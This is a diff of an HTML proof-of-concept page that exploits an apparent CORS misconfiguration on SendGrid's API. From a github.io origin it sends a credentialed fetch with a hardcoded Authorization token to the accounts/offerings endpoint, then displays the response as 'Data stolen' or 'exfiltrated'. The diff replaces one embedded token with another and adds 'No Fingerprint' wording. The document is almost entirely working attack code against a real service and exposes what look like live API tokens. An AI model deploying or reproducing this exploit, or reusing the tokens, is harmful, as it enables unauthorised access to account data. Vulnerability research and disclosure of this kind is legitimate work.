@@ -5,9 +5,9 @@
     <title>PoC: SendGrid CORS Vulnerability</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; color: #1c1e21; padding: 40px; text-align: center; }
-        .box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; max-width: 700px; margin: auto; border-top: 5px solid #ff4757; }
+        .box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; max-width: 800px; margin: auto; border-top: 5px solid #ff4757; }
         h2 { color: #ff4757; }
-        pre { background: #2f3542; color: #ffffff; padding: 15px; border-radius: 5px; text-align: left; overflow-x: auto; font-size: 13px; }
+        pre { background: #2f3542; color: #ffffff; padding: 15px; border-radius: 5px; text-align: left; overflow-x: auto; font-size: 13px; line-height: 1.5; }
         .status { font-weight: bold; margin: 15px 0; padding: 10px; border-radius: 5px; }
         .success { background: #e3f9e5; color: #1f8b24; }
         .error { background: #ffe3e3; color: #bf2121; }
@@ -17,7 +17,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>https://api.sendgrid.com/v3/accounts/offerings?_show&_pricing&_offerings</code></p>
+    <p>Target: <code>api.sendgrid.com/v3/accounts/offerings</code></p>
     <p>Source Origin: <code>https://stelemane.github.io</code></p>
     
     <div id="status" class="status">[*] Initializing Request...</div>
@@ -31,7 +31,7 @@
         
         const target = "https://api.sendgrid.com/v3/accounts/offerings?_show&_pricing&_offerings";
 
-        statusDiv.innerText = "[*] Sending request with Authorization & Credentials...";
+        statusDiv.innerText = "[*] Sending request with Authorization & Credentials (No Fingerprint)...";
 
         fetch(target, {
             method: "GET",
@@ -39,7 +39,8 @@
             credentials: "include",
             headers: {
                 "Accept": "application/json",
-                "Authorization": "token B2AB7UQHM7QSAIWJ.7TXCADQD6DKRRJNIQNP5INSG56GNZAYCLB6J5G4ZLC6HXKJZRCZRFITVIQ6YBYD7JZML5NHOZX75WHGTSKCEH4QV"
+                "Content-Type": "application/json",
+                "Authorization": "token SHDWFUX5JBEN5YXJ.IKDTDTFZSCPOZTKUKIXTV4ZEW42SKJIGCN2WADVRQVJEWOS63HXUU5EF6NSHJVEL4FXHBLP7ELMNMM2JRIND43IG"
             }
         })
         .then(response => {
@@ -48,7 +49,7 @@
                 statusDiv.className = "status success";
                 return response.json();
             } else {
-                statusDiv.innerText = "[-] FAILED: Server returned status " + response.status;
+                statusDiv.innerText = "[-] FAILED: Status " + response.status;
                 statusDiv.className = "status error";
                 return response.text();
             }
@@ -57,13 +58,13 @@
             outputDiv.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
             
             if (typeof data === 'object') {
-                alert("Vulnerability Confirmed!\nData stolen from api.sendgrid.com");
+                alert("Vulnerability Confirmed!\nData exfiltrated without Browser-Fingerprint.");
             }
         })
         .catch(err => {
-            statusDiv.innerText = "[-] ERROR: CORS Policy blocked the access.";
+            statusDiv.innerText = "[-] ERROR: Request failed.";
             statusDiv.className = "status error";
-            outputDiv.innerText = err.toString() + "\n\nNote: This means the server did not reflect the Origin: https://stelemane.github.io";
+            outputDiv.innerText = err.toString();
             console.error(err);
         });
     };
